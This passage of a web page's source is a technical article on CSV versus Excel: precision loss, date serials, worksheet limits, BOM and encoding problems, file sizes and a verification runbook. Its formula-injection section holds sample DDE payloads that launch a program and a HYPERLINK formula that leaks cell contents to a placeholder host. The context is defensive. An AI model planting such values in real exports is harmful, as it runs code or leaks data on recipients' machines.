          caption="Same input, three losses. The double rounds to a value one higher than the truth; Excel keeps fifteen significant digits and zeroes the rest; and both destroy an identifier that was never a number."
        />
        <P>
          The reason the 15-digit and 53-bit rules give different answers for the same 17-digit input is that one rounds in
          decimal and the other in binary. The consequence for a pipeline is that you cannot catch the damage by checking one of
          them. The <Rich text="[CSV to JSON converter](/format-converters/csv-to-json/)" /> reports both: an integer column with
          values above
          2^53 − 1 is typed <Rich text="`string-unsafe-number`" /> rather than number, a digit string longer than 15 characters
          is reported as <Rich text="`string-long-number`" />, and a numeric-looking value whose text does not survive a parse
          and re-format unchanged is <Rich text="`string-noncanonical-number`" />. Those are the three shapes that Excel and
          JavaScript disagree about, and the disagreement is the bug.
        </P>
        <H3>Day 60, which did not exist</H3>
        <P>
          Dates are worse, because in a spreadsheet a date is a number of days and the epoch is wrong. Excel’s 1900 date system
          counts serial 1 as 1 January 1900, which means serial 60 is 29 February 1900 — a date that never happened, 1900 being a
          century year that is not divisible by 400. The bug is inherited from Lotus 1-2-3 and kept for compatibility, and its
          visible effect is that every serial for a date on or after 1 March 1900 is one greater than an honest day count:
        </P>
        <CodeBlock
          title="serial arithmetic"
          language="python"
          code={'>>> (date(2026, 3, 1) - date(1899, 12, 31)).days\n46081                    # an honest count of days since 1 Jan 1900 = serial 1\n\n>>> (date(2026, 3, 1) - date(1899, 12, 30)).days\n46082                    # what Excel stores: the extra day is the phantom 29 Feb 1900'}
          caption="The worksheet part really stores the number 46082 for 2026-03-01, with the readable form supplied by a number format rather than by the value."
        />
        <P>
          Times are the fractional part of the same double, which is where the precision goes to die: the cell
          <Rich text="`46338.39583333334`" /> in that same workbook is 2026-11-12 at 09:30:00, and the fraction of a day that a
          double actually holds there multiplies back out to 34,200.0000008 seconds rather than 34,200. A day count stored in a
          binary fraction of a day cannot represent most exact seconds, so
          a timestamp that round-trips through a spreadsheet arrives a microsecond off, and a join on a timestamp string stops
          being a join. There is also a second epoch in the wild: the 1904 date system used by old Macintosh workbooks, whose
          serials are 1,462 days lower for the same calendar date, and which is recorded in the workbook part rather than
          anywhere in a CSV.
        </P>
        <Callout tone="tip" title="Say which epoch you mean, or say nothing in a spreadsheet at all">
          <P>
            Store timestamps as ISO 8601 text with an explicit offset in anything that crosses a system boundary, and accept that
            the moment that text is opened by a guessing reader it becomes a number in someone else’s epoch. If the artifact is
            genuinely for Excel and the timestamps must stay sortable and comparable, put them in an .xlsx as text with the column
            type set on import, or ship a second column with the epoch seconds as an integer under 2^53.
          </P>
        </Callout>
      </Section>

      <Section id="published-limits" title="Where the grid stops, and what happens on the way" kicker="Capacity">
        <P>
          The coercion table is about values being changed. The limits below are about values being dropped, which is quieter and
          much harder to notice, because the file still opens and the grid still looks like a table. All of these are Microsoft’s
          own published figures for the .xlsx format; the CSV row and column counts are not limited by the format at all, only by
          what the reader can store.
        </P>
        <DataTable
          caption="Published Excel limits that a CSV import can collide with, from Microsoft's specifications and limits page."
          head={['Limit', 'Value', 'What it means for a CSV import']}
          rows={[
            ['Rows in a worksheet', '1,048,576', 'Row 1,048,577 of a CSV has nowhere to go. Count your rows; do not rely on a warning.'],
            ['Columns in a worksheet', '16,384 (A to XFD)', 'A wide export loses everything past XFD, and the cut is easy to miss because the header row looks truncated rather than wrong.'],
            ['Characters in a cell', '32,767', 'A long JSON blob or a base64 payload in a column is capped at the ceiling, not at a sensible boundary.'],
            ['Arguments in a function', '255', 'On the same limits page, and it caps how wide a spreadsheet-side formula over your imported columns can get.'],
            ['Characters in a formula', '8,192', 'The ceiling our audit warns at for cell values, because a formula-shaped value that long is a paste bomb either way.'],
            ['Numeric precision', '15 significant digits', 'Not a capacity limit but a storage rule; see the precision section above.'],
            ['Largest positive value', 'about 9.99E+307', 'A digit string long enough to parse as 1E+308 stops being a number entirely.'],
            ['Unique cell formats', '65,490', 'Reached by pasting formatted data repeatedly, after which styling stops applying rather than the file failing.'],
            ['Non-adjacent cells selectable', '2,147,483,648', 'The number that is often misquoted as a file-size limit in bytes. It is a cell count, and it is not a size limit.'],
            ['Sort references', '64 in a single sort', 'Unlimited when sorts are applied sequentially, per Microsoft — not the 255 levels that get repeated in blog posts.'],
            ['Data Model, 32-bit Excel', '2 GB of virtual address space, roughly 500-700 MB available', 'Power Pivot ceilings, not worksheet ceilings, and the reason a big import is easier to fail than a big sheet.'],
            ['Workbook size, 64-bit Excel', 'No hard limit; limited only by available memory', 'Microsoft’s wording. Any page quoting “2.1 billion bytes” is misreading the cell-selection figure above.'],
          ]}
        />
        <H3>Silent truncation, and what is actually documented</H3>
        <P>
          The published limits are easy to verify. What happens on the way to them is not documented to the same standard, and
          that is the part that has cost people money. Three behaviours to treat as unproven until you have measured them in your
          own build and your own region:
        </P>
        <P>
          First, opening a CSV with more rows or columns than a worksheet holds. Whether you get a warning dialog, a partial
          import, or a clean-looking file that quietly ends at the boundary has varied between builds and between the double-click
          path and the Get Data path, so the only reliable answer is to count rows and columns yourself before the file goes
          anywhere near Excel. Second, saving a multi-sheet workbook as CSV: only one sheet is written, because the format has no
          concept of a second one, and the dialog that says so is one click away from being dismissed forever. Third, the
          character ceiling interacting with line breaks — a cell containing CRLF is legal CSV and a writer must quote it on the
          way out, and how the boundary cases behave when a value also runs up near 32,767 characters is not something to assume.
        </P>
        <CodeBlock
          title="measure your own boundaries instead of trusting a blog"
          language="bash"
          code={'# rows, columns and the widest row, without a spreadsheet in sight\npython3 -c "import csv,sys; r=csv.reader(sys.stdin); rows=list(r); \\\nprint(len(rows), max(len(x) for x in rows), max(len(c) for x in rows for c in x))" < orders.csv\n\n# does the header survive? print the first field of the first row with escapes visible\nhead -1 orders.csv | python3 -c "import sys,csv; print(repr(next(csv.reader(sys.stdin))[0]))"\n\n# sha256 before and after any round trip\nsha256sum orders.csv orders-from-excel.csv'}
          caption="Three commands, three classes of incident: a row and column count against the worksheet ceiling, a header whose first byte might be a BOM, and a byte-level diff of a round trip."
        />
        <P>
          The general rule is that a spreadsheet application is a fixed-capacity in-memory grid wearing a file-format costume,
          and every pipeline that treats it as a pass-through will eventually hand you a truncated file that looks complete.
          Anything larger than a few hundred thousand rows, or wider than a few hundred columns, belongs in a database or a
          columnar file and gets a CSV excerpt for the humans, generated deliberately rather than by someone saving a filtered
          view.
        </P>
      </Section>

      <Section id="encoding-round-trip" title="EF BB BF: the round trip that renames your header" kicker="Bytes">
        <P>
          A CSV file cannot state its own encoding; RFC 4180’s ABNF stops at 0x7E and its registration puts the charset in a
          media-type parameter that a file on a disk has no way to carry. So the reader guesses, and Excel’s guess is
          deterministic and wrong in a specific direction: on a Western Windows install it reads an unmarked file as code page
          1252, which means every UTF-8 multi-byte sequence is unpacked as one character per byte.
        </P>
        <CodeBlock
          title="the same name, four ways"
          language="bash"
          code={'$ printf \'Jos\\xc3\\xa9,Zi\\xc4\\x99ba\\n\' | xxd\n00000000: 4a6f 73c3 a92c 5a69 c499 6261 0a        Jos..,Zi..ba.\n\n# those UTF-8 bytes, decoded as Windows-1252, which is what Excel does without a BOM:\nJosÃ©              C3 A9 read as two characters: Latin capital A with tilde, then copyright sign\nZiÄ™ba             C4 99 read as two characters: Latin capital A with diaeresis, then trade mark sign\n\n# add a UTF-8 BOM and Excel is happy; a strict parser is not:\n$ head -c 3 orders.csv | xxd\n00000000: efbb bf                                  ...\n\n# the first header name a server-side parser then sees:\n"\\ufeffid"          # not "id": the key does not match, and the error is at row 1 column 1'}
          caption="Four bytes, two encodings and one three-byte mark decide whether José arrives as José, as JosÃ©, or as a column that does not exist."
        />
        <P>
          That last line is the incident people actually get paged for. The BOM is a compatibility mark, not content, but it sits
          at offset 0 in front of the first header name, and readers split into two camps: those that strip it, and those that
          fold it into the first field. Microsoft Excel needs it to read a UTF-8 CSV as UTF-8; RFC 4180 does not define it; most
          server-side parsers treat it as part of the header. The
          <Rich text="[CSV to JSON converter](/format-converters/csv-to-json/)" /> takes
          a deliberate middle position and says so in the report rather than in a footnote: it reports “A UTF-8 byte order mark
          (EF BB BF) starts the file.”, strips it before parsing so the first column is called what you named it, and puts in the
          hint that Excel on Windows needs the mark to read a UTF-8 CSV correctly while most server-side parsers will treat it as
          part of the first header name.
        </P>
        <H3>What a round trip through Excel really writes</H3>
        <P>
          Take the file in, save it back, and the differences are not limited to encoding. In current Windows builds expect some
          combination of: a BOM added or removed depending on whether you chose CSV or CSV UTF-8 in the Save As list; line endings
          normalised to CRLF; the delimiter set to your Windows list separator, which Microsoft documents explicitly and which is
          a semicolon on several locales rather than the RFC’s comma; quoting re-decided field by field, so the bytes of a
          well-behaved row change even when its values did not; every value retyped by the coercion table on this page; and only
          the active worksheet exported. Byte equality after that is not a property of CSV, it is a property of you having gotten
          lucky. The remedy is not to argue with Excel but to compare against something else, which is what the final section is
          for.
        </P>
        <P>
          Two encoding details round out the picture. If someone hands you a UTF-16 CSV — which some Windows tooling produces
          because the OS is UTF-16 inside — every ASCII byte is followed by a zero byte and the file is exactly twice the size it
          should be, while the first two bytes are FF FE rather than EF BB BF; a reader that assumes single-byte encoding will
          report a header named with interleaved nulls. And pasting text into Excel is a different code path from opening a file:
          the clipboard carries wide characters, so mojibake generally does not appear even though the type guessing still runs on
          every pasted cell. That asymmetry is why “it looks fine when I paste it” is not evidence about the file.
        </P>
        <KeyTerms
          items={[
            {
              term: 'EF BB BF',
              definition:
                'The UTF-8 encoding of U+FEFF, used as a byte order mark at offset 0. Tells Excel to read the file as UTF-8; readers that do not strip it treat it as part of the first field.',
            },
            {
              term: 'ANSI code page',
              definition:
                'The non-Unicode default encoding Windows gives an application without a BOM: 1252 for Western Europe, 1251 for Cyrillic, 932 for Japanese. It is a system setting, not a file property.',
            },
            {
              term: 'File origin',
              definition:
                'The Step 1 selector in the Text Import Wizard that lets you name the code page instead of accepting the default, including 65001 for UTF-8.',
            },
            {
              term: 'Mojibake',
              definition:
                'Text decoded with the wrong codec: UTF-8 C3 A9 read as 1252 gives Ã©. The damage is in the reader’s decode, so it is reversible only while you still know which codec was used.',
            },
            {
              term: 'FF FE / FE FF',
              definition:
                'The byte order marks for UTF-16LE and UTF-16BE. A CSV with either is double the size, has a NUL byte between every ASCII character, and is unreadable to most loaders.',
            },
            {
              term: 'CSV UTF-8',
              definition:
                'The Save As option modern Excel adds precisely because plain CSV wrote the ANSI code page: it emits UTF-8 with a BOM, which fixes Excel and can break your parser.',
            },
          ]}
        />
        <Callout tone="note" title="One artifact per audience">
          <P>
            The cleanest policy I know is to stop trying to satisfy both readers with one file. Ship plain UTF-8 without a BOM to
            programs, with the delimiter stated in the filename and the schema next to it. Ship a BOM’d UTF-8 CSV or, better, an
            .xlsx to people who will double-click it. Two files generated from the same source table costs you a step in a
            script; one file that tries to serve both costs you a data-quality ticket every month, and in the ticket the file
            always looks fine to whoever sent it.
          </P>
        </Callout>
      </Section>

      <Section id="formula-injection" title="The equals sign is not data" kicker="Security consequence">
        <P>
          There is a class of bug where the file is valid, the values are correct and the recipient’s machine runs a program
          anyway. It needs no vulnerability and no exploit: it only needs a producer who writes customer-supplied text into a CSV
          column and a recipient who opens it in a spreadsheet. The field is data at every point in your system and becomes code
          at the last step, in a format that has no syntax for saying otherwise.
        </P>
        <CodeBlock
          title="a file that is a problem"
          language="csv"
          code={'id,note\n1,"=HYPERLINK(""https://example.invalid/?d=""&A1,""click"")"\n2,=cmd|\'/c calc\'!A0\n3,+cmd|\'/c calc\'!A0\n4,-2+3+cmd|\'/c calc\'!A0\n5,@SUM(1,2)+cmd|\'/c calc\'!A0'}
          caption="Five fields, four leading characters that a spreadsheet reads as entry signals: =, +, - and @. The last three exist because Excel also accepts a formula that begins with an operator or an at-sign."
        />
        <P>
          The weakness has a classification — CWE-1236, “Improper Neutralization of Formula Elements in a CSV File” — and an
          OWASP page describing both the mechanism and the mitigations. The payloads divide by what they cost the recipient. A
          <Rich text="`=HYPERLINK(...)`" /> leaks a reference when someone clicks. A <Rich text="`=WEBSERVICE(...)`" /> or an
          external workbook reference fetches a URL from inside the document, which exfiltrates whatever the attacker can
          interpolate into the cell. A dynamic data exchange command in the shape above can start another program, and DDE needs
          no “formula” in the ordinary sense at all, which is why it survived so long behind a prompt about enabling content.
        </P>
        <H3>What our converter does when it sees one</H3>
        <P>
          Two things, in two different places, and the distinction between them matters because one changes the file and one only
          changes the report.
        </P>
        <P>
          On the write path, the CSV writer quotes any field that begins with <Rich text="`=`" />, <Rich text="`+`" />,
          <Rich text="`-`" /> or <Rich text="`@`" /> and is longer than one character, along with the fields that genuinely need
          quoting under rule 6 and anything with leading or trailing whitespace. That is a deliberate, visible decision in the
          output rather than a silent one: the
          <Rich text="[JSON to CSV converter](/format-converters/json-to-csv/)" /> offers quoting as “only
          where required”, “every field” or “numeric-looking text quoted”, and the formula guard is part of “required”.
        </P>
        <P>
          Be clear about what the quote buys you. It keeps the file parseable, and it makes the field unambiguously one field to
          every reader that follows the grammar — including the readers you control. It is not an escape from evaluation in a
          spreadsheet that removes the quotes and then decides what the remaining characters are, which is the same reason quoting
          did not save the leading zeros. The mitigations that do change the recipient’s behaviour all change the value: prefix
          an apostrophe, which Excel treats as its own text marker and every other consumer treats as data; prefix a space, which
          is visible and annoying; or refuse to put untrusted text in an export that a human will double-click. Anyone who tells
          you there is a byte sequence that is both faithful to the data and inert in Excel has not thought about it as hard as
          the format deserves.
        </P>
        <P>
          On the read path, the audit in the
          <Rich text="[CSV to JSON converter](/format-converters/csv-to-json/)" /> labels the risk “Formula
          injection (DFXP)” for any value starting with <Rich text="`=`" />, <Rich text="`+`" /> or <Rich text="`@`" />, or with
          a minus that is not the start of a negative number, alongside “Leading zero dropped”, “Precision loss / scientific
          notation”, “Gene symbol autocorrect”, “Excel cell length limit”, “Excel column limit” and “Excel row limit”. It returns
          up to forty findings and the workspace shows the first fifteen, because the point is to tell you that a column is
          dangerous rather than to list every occurrence.
        </P>
        <Callout tone="risk" title="Do not trust the reader’s settings">
          <P>
            Vendors have tightened defaults here, and the sequence is genuinely version-dependent: dynamic data exchange
            behaviour and formula-entry protections differ between Excel editions, channels and even between the desktop and web
            clients, so treat any claim about a specific default as “verify in your build”. What is not version-dependent is that
            your export is opened on someone else’s machine, with someone else’s settings, and that a defence resting on those
            settings is not yours to make. Neutralise at write time, or scope the export so that free-text columns are not in it.
          </P>
        </Callout>
      </Section>

      <Section id="size-and-fidelity" title="Bytes per row, measured on the same table" kicker="The trade">
        <P>
          Size is the argument everybody makes for one side and it is the weakest one, because the answer depends on a variable
          nobody controls: how compressible your data is. So I measured it rather than asserting it. The table is the same shape
          for every row count — eight columns of record id, IBAN, account number, customer name, city, capture timestamp, amount
          in cents and a loyalty code — generated once, then serialised three ways: plain CSV, XLSX written by openpyxl, and the
          CSV through gzip at default level.
        </P>
        <DataTable
          caption="One table, three serialisations, three row counts. Real byte counts from this session; ratios are XLSX and gzipped CSV relative to the CSV."
          head={['Rows', 'CSV', 'XLSX', 'XLSX / CSV', 'CSV + gzip', 'Bytes per row, CSV / XLSX / gz']}
          rows={[
            ['500', '49,549', '31,301', '0.63', '11,022', '99 / 63 / 22'],
            ['5,000', '510,793', '264,226', '0.52', '104,341', '102 / 53 / 21'],
            ['50,000', '5,248,191', '2,604,887', '0.50', '1,037,348', '105 / 52 / 21'],
          ]}
          foot="At every row count the gzipped CSV was smaller than the XLSX — by roughly 2.5x at 50,000 rows — and at 500 rows the XLSX was paying for a theme and a style table nobody used."
        />
        <P>
          Three readings of that table. The XLSX ratio improves as the file grows and then flattens around 0.50, because the
          fixed package cost — roughly 1 KB of ZIP structure plus 1.5 KB of compressed theme plus a few hundred bytes each of
          styles, content types and relationships, measured above — is amortised over more rows. Compressed CSV loses nothing as
          row count grows, because it has no fixed cost at all. And gzipped CSV beats XLSX on size at every point, because XLSX
          <em>is</em> a ZIP of deflated XML parts, so it is compressing content that is more verbose than your CSV was, using the
          same algorithm.
        </P>
        <P>
          The honest caveat is entropy. These rows contain repeated city names, a fixed set of account prefixes and a timestamp
          that steps forward predictably, so deflate has a lot to work with in both formats. A table of random UUIDs compresses
          badly in both; a table with one high-cardinality column and six low-cardinality ones favours XLSX, because a shared
          string table stores each distinct value once and cells reference it by index, which is a win deflate cannot fully
          replicate across a byte stream. Measure your own data before you let a file-size argument decide an architecture, and
          note that my package was written by a library rather than by Excel, so your constants will differ.
        </P>
        <H3>What the extra bytes actually buy</H3>
        <P>
          Size is the wrong axis, and the comparison that matters is fidelity — how much of your meaning survives the trip. On
          that axis there is no contest, and the CSV loses in ways that no amount of discipline fixes, because they are not
          mistakes, they are absences:
        </P>
        <DataTable
          caption="Fidelity, not size: what each artefact can represent at all. A gap here is not a bug to work around; the format has no field for it."
          head={['Property of your table', 'CSV', 'XLSX', 'How it is stored in XLSX']}
          rows={[
            ['A string that must stay a string', 'No', 'Yes', 't="s" or t="inlineStr" on the cell; a shared string index or the literal.'],
            ['The distinction between 7 and "007"', 'No', 'Yes', 'Type attribute, and the text is stored verbatim.'],
            ['A date that is not a day count', 'No', 'Mostly', 'A serial number plus a numFmt in xl/styles.xml. Still lossy below a second.'],
            ['A null that is not an empty string', 'No', 'No', 'Neither format has a null. Empty means whatever your loader says it means.'],
            ['More than one sheet', 'No', 'Yes', 'One worksheet part per sheet, listed in xl/workbook.xml.'],
            ['Column order independent of the header text', 'No', 'Yes', 'Cells carry explicit r="C7" addresses; a missing cell is simply absent.'],
            ['A formula that stays a formula', 'No', 'Yes', 'Formula elements plus cached values, and calcPr to say whether to recalculate.'],
            ['The encoding, declared in the file', 'No', 'Yes', 'The XML declaration states UTF-8, and the parts are XML.'],
            ['A ragged row, represented faithfully', 'Ambiguous', 'Yes', 'A row with three cells has three cells; in CSV it has three fields and a missing name.'],
            ['Readable by a text editor and grep', 'Yes', 'No', 'It is a ZIP archive.'],
            ['Appendable without rewriting', 'Yes', 'No', 'The central directory at the end of the archive has to be rewritten.'],
          ]}
        />
        <P>
          Those last two rows are why CSV survives at all. It is append-only, streamable, greppable, diffable in a code review,
          and readable by every program that has ever existed. A file you can pipe into <Rich text="`wc -l`" /> is worth a great
          deal in an incident. XLSX is a random-access archive that must be closed properly and, as this page has argued, its
          advantage is not that it is a better table but that it is a table with the type decisions already made.
        </P>
      </Section>

      <Section id="decision-table" title="Which one to put in the pipeline" kicker="Recommendations">
        <P>
          Three questions decide it, in this order: does the value’s meaning depend on a type? does the reader have opinions?
          does anything downstream compare bytes? The short answer is that CSV is a display artifact for humans who will import
          it into something, and XLSX is what you send when that something is Excel. Neither is a wire format; JSON is, and if you
          are choosing between CSV and XLSX for a system-to-system handoff you have already lost the argument you did not have.
        </P>
        <DataTable
          caption="The decision table. Every row is a claim about the reader, not about the format."
          head={['Situation', 'Write this', 'Because']}
          rows={[
            ['Export for an analyst who opens it in Excel', 'XLSX', 'The type decisions are recorded instead of guessed, and it is smaller than the CSV anyway.'],
            ['Export for a human who will only ever read it', 'CSV, plain UTF-8', 'No package to explain, and it prints in a terminal.'],
            ['Handoff between two systems', 'JSON, or newline-delimited JSON', 'Types, nulls and nesting exist. Use CSV only when the other side insists.'],
            ['Bulk load into a database or a lake', 'TSV or CSV, gzipped', 'The 0.20 ratio above beats XLSX, and the loaders stream text rather than unzip XML.'],
            ['Identifiers with leading zeros or over 15 digits', 'Never bare CSV to Excel', 'Either an XLSX with a string type or an import with the column set to Text.'],
            ['Spreadsheet as the system of record', 'XLSX, and only XLSX', 'A CSV cannot hold formulas, sheets, types or comments, so every save is a lossy round trip.'],
            ['File that goes in a git diff or a checksum', 'CSV without a BOM, LF endings, one quoting rule', 'Any of those three choices flip the hash without changing a value.'],
            ['Untrusted text in a column a human will open', 'Quoted, flagged, and say so in the cover note', 'See the formula section: quoting is necessary, not sufficient, and you cannot rely on their reader.'],
          ]}
        />
        <P>
          Two rules of thumb that settle most arguments without measurement. Do not use “Excel CSV” as an interchange format: it
          is a spreadsheet’s idea of a text file, complete with a locale-derived delimiter, an added BOM and re-typed values, and
          every program downstream of it will need the same three workarounds forever. And if one artifact must serve both a
          human and a machine, generate two from one source rather than negotiating a middle one; the cost is one extra line in a
          script, and the alternative is the runbook below becoming a monthly ritual.
        </P>
      </Section>

      <Section id="prove-nothing-changed" title="A runbook: prove that nothing moved" kicker="Verification">
        <P>
          Everything above is a reason to stop trusting the round trip and start measuring it. This is the sequence I would use
          on any handoff where a spreadsheet sits in the middle, in order, with the failure each step catches. It takes about two
          minutes and a terminal, and every check is a fact about bytes rather than an opinion about a grid.
        </P>
        <H3>1. Fingerprints, before and after</H3>
        <P>
          Hash the file the moment you produce it and hash whatever comes back. Equal hashes mean nothing changed; unequal hashes
          tell you nothing about what changed, which is why the next four steps exist. A CSV writer is free to quote any field it
          likes under rule 5, so a hash difference can be entirely cosmetic — and that is exactly the case that hides a real one.
        </P>
        <CodeBlock
          title="fingerprint and shape"
          language="python"
          code={'import csv, hashlib\n\nraw = open("orders.csv", "rb").read()\nprint("sha256 ", hashlib.sha256(raw).hexdigest())\nprint("bom    ", raw[:3] == b"\\xef\\xbb\\xbf")\nprint("crlf   ", raw.count(b"\\r\\n"), "lf only", raw.count(b"\\n") - raw.count(b"\\r\\n"))\nprint("quotes ", raw.count(b"\\""))\n\nrows = list(csv.reader(open("orders.csv", newline="", encoding="utf-8-sig")))\nhead, body = rows[0], rows[1:]\nprint("rows   ", len(body), "cols", len(head))\n\nwidths = {}\nfor r in body:\n    widths[len(r)] = widths.get(len(r), 0) + 1\nprint("row width histogram:", widths)   # every row must have exactly len(head) fields\nprint("blank header cells:", [i for i, h in enumerate(head) if not h.strip()])'}
          caption="Nine facts about a file that take one run to establish: hash, BOM, line endings, quote count, row and column counts, the width histogram and the empty header names."
        />
        <H3>2. Per-row field counts with a real parser</H3>
        <P>
          The histogram above is the only trustworthy way to spot a shifted file. Count fields with a state machine — Python’s
          <Rich text="`csv`" /> module, RFC 4180’s grammar, quotes and embedded line breaks and all — and never with
          <Rich text="`split(&apos;,&apos;)`" /> or <Rich text="`awk -F,`" />, which disagree with the format about quoted commas and
          will report a clean file as ragged, or a corrupted file as clean. A uniform width across every row plus the expected
          header is what “nothing shifted” looks like; one row of nine fields is a comma that arrived inside a name.
        </P>
        <H3>3. Prove the fragile columns are still strings</H3>
        <P>
          Type is the thing CSV cannot carry, so check it by looking for the damage rather than the type. Every identifier column
          should still match its original pattern exactly: leading zeros present, digit count unchanged, no field matching a
          scientific-notation shape, and nothing date-shaped in a column that should hold text.
        </P>
        <CodeBlock
          title="the four patterns that catch almost every incident"
          language="python"
          code={'import re\n\nzeros   = re.compile(r"^0\\d{1,}$")              # 007 became 7; the column is now wrong\nscinot  = re.compile(r"^\\d+\\.\\d+[Ee]\\+?\\d+$")   # 1.23456789012346E+16: precision already gone\nlongnum = re.compile(r"^\\d{16,}$")              # over Excel\'s 15 significant digits\nslashy  = re.compile(r"^\\d{1,2}[-/]\\d{1,2}[-/]\\d{1,4}$")   # a date where a code should be\n\nfor name in ("order_ref", "account", "loyalty_code"):\n    vals = [r[head.index(name)] for r in body]\n    print(name,\n          "zeros:", sum(bool(zeros.match(v)) for v in vals),\n          "sci  :", sum(bool(scinot.match(v)) for v in vals),\n          "16+  :", sum(bool(longnum.match(v)) for v in vals),\n          "datey:", sum(bool(slashy.match(v)) for v in vals))'}
          caption="Four regexes over three columns. Any non-zero in a column you exported as text is a round trip that retyped it. These are close to the checks the spreadsheet audit runs."
        />
        <H3>4. Paste it into a converter and read the report</H3>
        <P>
          This is the step that catches the failures you did not think to test for, and it is the reason the tool exists. Take
          the file that came back from Excel and put it into the
          <Rich text="[CSV to JSON converter](/format-converters/csv-to-json/)" />, and
          read three parts of the output before you touch a download. The sniffing line tells you what delimiter it found and
          why: it counts candidate separators outside quoted regions in the first forty non-blank lines and reports something like
          "comma (,) appears 7× on line 1 and in the same count in 40/40 sampled lines", or admits that a delimiter scored
          highest but the counts vary and you should set it explicitly — a semicolon arriving from a European Excel is the
          standard reason that line is ambiguous. The typing report, on “All strings (safest)”, shows which columns it would have
          retyped and keeps 17-digit and 16-digit integers as text where a JSON parser would not. The risk list names the
          spreadsheet damage in the values themselves, which is the same list the audit produces on the way out.
        </P>
        <H3>5. Compare to the source, as data</H3>
        <P>
          Then do the thing nobody does: convert the original table to JSON, convert the Excel round-tripped file to JSON with
          identical settings, and diff the two documents as structures rather than as text. Row count, column set in order, and
          for every cell a string comparison of what was written against what came back. A diff of the raw files will drown in
          quoting noise; a structural diff of the parsed values reports only real changes, and it is short enough to read.
        </P>
        <Callout tone="tip" title="Record the five numbers with the file">
          <P>
            sha256 of the delivered bytes, row count, column count, the header names as a list, and whether a BOM was present.
            That is the entire evidence chain for a handoff, it fits in a ticket comment, and it converts “the file is corrupted”
            into “row 40,218 exceeds the column limit” in about ten seconds. When the next report arrives saying your export broke
            someone’s numbers, these five values decide whose build did it — and in my experience it is nearly never the writer.
          </P>
        </Callout>
        <P>
          The uncomfortable summary of all eleven sections is that CSV and Excel are not two representations of one thing. One is
          a format with a documented grammar and six deliberate silences; the other is an application that fills those silences
          with guesses, and then hands the result to the next program as though it were the data. Neither of those facts is going
          to change, so the engineering answer is to stop hoping the guess goes your way and start checking it, which is all any
          of the tools on this site do.
        </P>
      </Section>
    </>
  )
}
